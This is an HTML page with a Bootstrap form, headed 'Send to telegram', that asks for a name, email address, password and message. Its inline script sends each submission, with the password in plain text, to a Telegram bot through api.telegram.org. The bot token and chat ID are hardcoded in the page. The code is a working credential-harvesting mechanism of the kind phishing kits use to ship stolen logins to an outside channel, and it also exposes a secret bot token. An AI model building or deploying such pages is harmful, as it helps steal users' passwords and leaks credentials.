<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Message</title>
    <link rel="stylesheet" href="./style.css">
    <link rel="icon" href="https://cdn.pixabay.com/photo/2020/10/17/13/21/telegram-5662082_1280.png">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
</head>
<body>
    <div class="con">
      <div class="box">
        <h1>Send to telegram <svg xmlns="http://www.w3.org/2000/svg" width="50" height="50" viewBox="0 0 24 24" style="fill: rgba(78, 179, 242, 1);"><path d="m20.665 3.717-17.73 6.837c-1.21.486-1.203 1.161-.222 1.462l4.552 1.42 10.532-6.645c.498-.303.953-.14.579.192l-8.533 7.701h-.002l.002.001-.314 4.692c.46 0 .663-.211.921-.46l2.211-2.15 4.599 3.397c.848.467 1.457.227 1.668-.785l3.019-14.228c.309-1.239-.473-1.8-1.282-1.434z"></path></svg></h1>
        <form id="form">

          <div class="form-group">
            <label for="exampleInputPassword1">Name</label>
            <input type="text" name="name" class="form-control" id="exampleInputPassword1 name" placeholder="Name">
          </div>

            <div class="form-group">
              <label for="exampleInputEmail1">Email address</label>
              <input type="name" name="email" class="form-control" id="exampleInputEmail1 email" aria-describedby="emailHelp" placeholder="Enter email">
              <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
            </div>
            
            <div class="form-group">
              <label for="exampleInputEmail1">Password</label>
              <input type="password" name="password" class="form-control" id="exampleInputEmail1 email" aria-describedby="emailHelp" placeholder="Enter password">
            </div>
            
            <div class="form-group">
              <label for="exampleFormControlTextarea1">Textarea</label>
              <textarea placeholder="Text" name="text" class="form-control" id="exampleFormControlTextarea1 text" rows="3"></textarea>
            </div>
            <div class="min">
            <button type="submit" class="btn btn-primary">Submit</button>
            </div>
          </form>
    </div>
    </div>

    
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <script>
        const TOKEN = "6007574391:AAHb8OtKqA19Z2jXfM5r7T8oLzKMthp7TW8"
        const CHAT_ID = "-1001898709374"
        const form = document.querySelector("#form")
        const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`

        form.addEventListener("submit", function(data) {
            data.preventDefault();

            

            let message = `<b>Message</b>\n`
            message += `<b>User: ${ this.name.value }</b>\n`
            message += `<b>Email: ${ this.email.value }</b>\n`
            message += `<b>Password: ${ this.password.value }</b>\n`
            message += `<b>Text: ${ this.text.value }</b>\n`

            axios.post(URL_API, {
                chat_id: CHAT_ID,
                parse_mode: "html",
                text: message
            })
        })
    </script>
    <script src="./main.js"></script>
</body>
</html>
